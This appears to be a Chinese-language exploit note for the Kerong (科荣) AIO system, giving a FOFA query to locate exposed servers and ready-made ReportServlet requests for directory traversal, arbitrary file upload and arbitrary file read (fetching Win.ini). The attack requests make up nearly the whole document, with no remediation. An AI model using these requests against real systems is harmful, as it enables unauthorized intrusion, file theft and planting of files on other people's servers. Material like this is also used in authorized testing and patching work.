## 科荣 AIO任意文件上传-目录遍历-任意文件读取漏洞

## fofa
```
body="changeAccount('8000')"
```
## 目录遍历
```
http://xxxxxx/ReportServlet?operation=getFileList&path=../../../
```

## 文件上传
```
POST /ReportServlet?operation=saveFormatFile&fileName=demo.css&language= HTTP/1.1
Host: xxxxxx
Connection: lose
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

demo
```

## 任意文件读取
```
http://xxxxx/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
```
